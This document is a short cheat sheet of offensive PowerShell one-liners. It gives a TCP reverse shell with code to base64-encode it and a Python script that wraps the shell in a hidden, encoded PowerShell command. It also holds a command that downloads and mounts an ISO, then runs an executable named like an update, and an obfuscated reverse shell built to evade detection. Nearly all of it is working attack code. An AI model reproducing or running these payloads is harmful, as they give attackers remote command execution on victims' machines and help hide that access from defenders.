# Powershell OneLiner
## pwsh
```powershell
#pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.193",8089);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```
## python Generate
```bash
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.49.117",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)
```
# Powershell ISO Oneliner
```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://172.21.1.0/windows.iso', 'C:\Windows\Tasks\windows.iso'); $MountedImage = Mount-DiskImage -ImagePath 'C:\Windows\Tasks\windows.iso' -PassThru; Start-Process -FilePath ($MountedImage | Get-Volume).DriveLetter + ':\msupdate.exe'; dismount-DiskImage -ImagePath $MountedImage.ImagePath"
```
# Linux Powershell Oneliner
```powershell
$ezYSZf = & (("New-ScheduledJobOption")[0,1,2,3,14,15,13,1,5,18] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})("Stay.Off.Ronins.Lawn".Replace("Stay",127).Replace("Off",0+255-255).Replace("Ronins", 0+1-1).Replace("Lawn",0+0+0+1),(443*2-443));
$VXm = $ezYSZf.GetStream();
[byte[]]$0bLXRjHKPvWQUhq = (10023-10023)..(13107*5)|<##>%{$_}<##>|%{0};
while(($i = $VXm.Read($0bLXRjHKPvWQUhq, 0, $0bLXRjHKPvWQUhq.Length)) -ne 0)
{;
$Tc9dYRLI5 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($0bLXRjHKPvWQUhq,0, $i);
$sendback = (iex $Tc9dYRLI5 2>&1 |<##>%{$_}<##>| Out-String );
$YzlnHIRT = $sendback + $(([string]::join('', ( (80,83,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})) + (pwd).Path + $(([string]::join('', ( (62,62,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_}));
$sdfghjklASDA222 = ([text.encoding]::ASCII).GetBytes($YzlnHIRT);
$VXm.Write($sdfghjklASDA222,0,$sdfghjklASDA222.Length);$VXm.Flush()
};
$ezYSZf.Close()
```